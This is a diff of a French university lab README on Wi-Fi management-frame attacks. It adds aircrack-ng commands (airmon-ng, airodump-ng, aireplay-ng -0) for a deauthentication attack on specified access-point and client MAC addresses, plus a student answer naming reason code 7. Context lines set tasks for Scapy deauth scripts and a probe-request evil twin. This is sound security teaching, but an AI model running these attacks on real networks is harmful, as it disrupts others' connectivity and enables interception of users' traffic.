@@ -86,12 +86,29 @@ Le corps de la trame (Frame body) contient, entre autres, un champ de deux octet
 | 39 | Requested from peer QSTA due to timeout                                                                                                                                              |
 | 40 | Peer QSTA does not support the requested cipher suite                                                                                                                                              |
 | 46-65535 | Reserved                                                                                                                                              |
- 
+
 a) Utiliser la fonction de déauthentification de la suite aircrack, capturer les échanges et identifier le Reason code et son interpretation.
+
+Manipulation :
+
+```bash
+iwconfig | grep "Access Point" #Exécuté sur la machine hôte afin de connaître l'adresse MAC de l'AP
+ifconfig -a #Exécuté sur la machine hôte afin d'obtenir l'adresse MAC de la machine hôte
+iwlist wlp59s0 channel #Exécuté sur la machine hôte afin de connaître le cannal
+sudo airmon-ng start wlan0 #Exécuté sur la VM pour passer l'interface en mode monitor
+sudo airodump-ng --channel 132 wlan0 #Exécuté sur la VM
+sudo aireplay-ng -0 5 -a F2:91:BB:B7:82:B7 -c 9C:B6:D0:B6:D9:DD wlan0 #Attaque de déauthentification où -a correspond à l'adresse MAC de l'AP et -c l'adresse MAC de la machine hôte
+```
 
 __Question__ : quel code est utilisé par aircrack pour déauthentifier un client 802.11. Quelle est son interpretation ?
 
+![image-20220324161403584](images/image-20220324161403584.png)
+
+Cela utilise le code 7 ( Class 3 frame received from nonassociated station).
+
 __Question__ : A l'aide d'un filtre d'affichage, essayer de trouver d'autres trames de déauthentification dans votre capture. Avez-vous en trouvé d'autres ? Si oui, quel code contient-elle et quelle est son interpretation ?
+
+
 
 b) Développer un script en Python/Scapy capable de générer et envoyer des trames de déauthentification. Le script donne le choix entre des Reason codes différents (liste ci-après) et doit pouvoir déduire si le message doit être envoyé à la STA ou à l'AP :
 
@@ -150,7 +167,7 @@ A des fins plus discutables du point de vue éthique, la détection de client s'
 ### 4. Probe Request Evil Twin Attack
 
 Nous allons nous intéresser dans cet exercice à la création d'un evil twin pour viser une cible que l'on découvre dynamiquement utilisant des probes.
- 
+
 Développer un script en Python/Scapy capable de detecter une STA cherchant un SSID particulier - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
 
 Pour la détection du SSID, vous devez utiliser Scapy. Pour proposer un evil twin, vous pouvez très probablement réutiliser du code des exercices précédents ou vous servir d'un outil existant.
